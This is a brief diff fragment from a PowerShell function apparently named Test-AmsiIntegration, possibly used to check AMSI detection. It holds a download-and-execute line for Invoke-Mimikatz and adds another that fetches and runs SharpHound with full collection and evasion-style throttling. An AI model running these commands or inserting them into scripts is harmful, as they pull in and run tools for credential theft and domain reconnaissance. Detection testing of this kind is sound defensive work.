@@ -388,3 +388,4 @@ function Test-AmsiIntegration {
 
 
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethods All -Throttle 500 -Jitter 20 -OutputDirectory .
